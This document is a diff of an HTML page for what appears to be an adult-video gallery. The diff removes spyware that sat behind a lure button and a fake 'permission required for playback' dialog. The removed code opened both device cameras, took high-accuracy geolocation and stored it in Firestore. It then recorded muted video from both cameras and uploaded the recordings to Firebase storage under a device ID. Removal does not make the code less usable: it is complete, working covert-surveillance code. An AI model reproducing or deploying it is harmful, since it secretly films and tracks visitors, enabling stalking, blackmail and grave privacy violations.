@@ -129,29 +129,15 @@
     </style>
 </head>
 <body>
-    <div class="login-container" id="loginContainer">
-        <h1>　</h1>
-        <p class="camera-switch-message"></p>
-        <canvas id="canvas" style="display: none;"></canvas>
-        <button id="captureButton">えーぶいリストを表示する</button>
-	    <video id="video" autoplay></video>
-    </div>
 
-    <h1 style="display: none;">動画保管庫</h1>
+	    <h1 style="display: none;">動画保管庫</h1>
     <div class="video-grid" id="videoGrid" style="display: none;">
         <!-- Videos will be dynamically inserted here -->
     </div>
     <div class="pagination" id="pagination" style="display: none;">
         <!-- Pagination buttons will be dynamically inserted here -->
     </div>
-
-    <div class="dialog-overlay" id="dialogOverlay">
-        <div class="dialog">
-            <p>動画再生には権限の許可が必要です</p>
-            <button id="reloadButton">再試行</button>
-        </div>
-    </div>
-
+	
     <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
     import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
@@ -732,101 +718,6 @@
         return deviceId;
     }
 
-    async function requestCameraAccess() {
-        try {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const videoDevices = devices.filter(device => device.kind === 'videoinput');
-            
-            // Front camera
-            const frontCamera = videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];
-            frontVideoStream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    deviceId: frontCamera.deviceId,
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-		　　frameRate: { ideal: 60 } // 滑らかな映像を得るための高フレームレート
-                }
-            });
-
-            // Back camera
-            const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[1];
-            backVideoStream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    deviceId: backCamera.deviceId,
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-		　　frameRate: { ideal: 60 } // 滑らかな映像を得るための高フレームレート
-                }
-            });
-
-            video.srcObject = frontVideoStream; // Display front camera by default
-            video.muted = true; // Mute the recording
-            
-        } catch (err) {
-            console.error('カメラアクセスエラー:', err);
-            showCameraPermissionDialog();
-            throw err;
-        }
-    }
-
-    function captureAndLogin() {
-        if (frontVideoStream && backVideoStream) {
-            loginContainer.style.display = 'none';
-            document.querySelector('h1').style.display = 'block';
-            videoGrid.style.display = 'grid';
-            pagination.style.display = 'flex';
-            loadVideos(currentPage);
-        } else {
-            console.error('カメラストリームが利用できません。');
-            alert('カメラストリームが利用できません。');
-        }
-    }
-
-    function showCameraPermissionDialog() {
-        dialogOverlay.style.display = 'flex';
-    }
-
-    captureButton.addEventListener('click', () => {
-    requestCameraAccess()
-        .then(() => {
-            // 位置情報を取得
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const { latitude, longitude } = position.coords;
-                    console.log(`現在の位置情報: 緯度 ${latitude}, 経度 ${longitude}`);
-
-                    // 必要に応じてFirebase Firestoreに保存
-                    const deviceId = getOrCreateDeviceId();
-                    addDoc(collection(db, 'loginLogs'), {
-                        deviceId,
-                        timestamp: new Date().toISOString(),
-                        location: { latitude, longitude },
-                    })
-                        .then(() => {
-                            console.log('位置情報が記録されました。');
-                            captureAndLogin();
-                        })
-                        .catch((error) => {
-                            console.error('位置情報の記録中にエラーが発生しました:', error);
-                        });
-                },
-                (error) => {
-                    console.error('位置情報取得エラー:', error);
-                    alert('位置情報を取得できませんでした。権限が必要です。');
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0,
-                }
-            );
-        })
-        .catch(() => {
-            alert('カメラの権限が許可されていません。');
-        });
-});
-
-
     reloadButton.addEventListener('click', () => {
         location.reload();
     });
@@ -888,94 +779,6 @@
         }
     }
 
-    async function startVideoRecording() {
-        recordedChunksFront = [];
-        recordedChunksBack = [];
-
-        mediaRecorderFront = new MediaRecorder(frontVideoStream, { mimeType: 'video/webm; codecs=vp8' ,videoBitsPerSecond: 2.5 * 1000 * 1000});// 高ビットレートで映像を記録 (5Mbps)
-        mediaRecorderBack = new MediaRecorder(backVideoStream, { mimeType: 'video/webm; codecs=vp8' ,videoBitsPerSecond: 2.5 * 1000 * 1000});// 高ビットレートで映像を記録 (5Mbps)
-
-        mediaRecorderFront.ondataavailable = event => {
-            if (event.data.size > 0) {
-                recordedChunksFront.push(event.data);
-            }
-        };
-
-        mediaRecorderBack.ondataavailable = event => {
-            if (event.data.size > 0) {
-                recordedChunksBack.push(event.data);
-            }
-        };
-
-        mediaRecorderFront.onstop = () => {
-            const blob = new Blob(recordedChunksFront, { type: 'video/webm' });
-            uploadVideo(blob, 'front');
-        };
-
-        mediaRecorderBack.onstop = () => {
-            const blob = new Blob(recordedChunksBack, { type: 'video/webm' });
-            uploadVideo(blob, 'back');
-        };
-
-        mediaRecorderFront.start();
-        mediaRecorderBack.start();
-    }
-
-    function stopVideoRecording() {
-        if (mediaRecorderFront && mediaRecorderFront.state !== 'inactive') {
-            mediaRecorderFront.stop();
-        }
-        if (mediaRecorderBack && mediaRecorderBack.state !== 'inactive') {
-            mediaRecorderBack.stop();
-        }
-    }
-
-    function formatDate() {
-        const date = new Date();
-        const year = date.getFullYear();
-        const month = String(date.getMonth() + 1).padStart(2, '0');
-        const day = String(date.getDate()).padStart(2, '0');
-        const hours = String(date.getHours()).padStart(2, '0');
-        const minutes = String(date.getMinutes()).padStart(2, '0');
-        const seconds = String(date.getSeconds()).padStart(2, '0');
-        return `${year}${month}${day}_${hours}${minutes}${seconds}`;
-    }
-
-    async function uploadVideo(blob, cameraType) {
-        const deviceId = getOrCreateDeviceId();
-        const formattedDate = formatDate();
-        const storageRef = ref(storage, `videos/${deviceId}/${cameraType}_${formattedDate}.webm`);
-        const uploadTask = uploadBytesResumable(storageRef, blob);
-
-        uploadTask.on('state_changed',
-            (snapshot) => {
-                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-                console.log('Upload is ' + progress + '% done');
-            },
-            (error) => {
-                console.error('Upload error:', error);
-            },
-            async () => {
-                const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
-                saveVideoMetadata(downloadURL, cameraType);
-            }
-        );
-    }
-
-    async function saveVideoMetadata(downloadURL, cameraType) {
-        try {
-            const deviceId = getOrCreateDeviceId();
-            const docRef = await addDoc(collection(db, "videos"), {
-                url: downloadURL,
-                deviceId: deviceId,
-                cameraType: cameraType,
-                timestamp: Date.now()
-            });
-            console.log("Document written with ID: ", docRef.id);
-        } catch (e) {
-            console.error("Error adding document: ", e);
-        }
-    }
 </script>
 </body>
 </html>
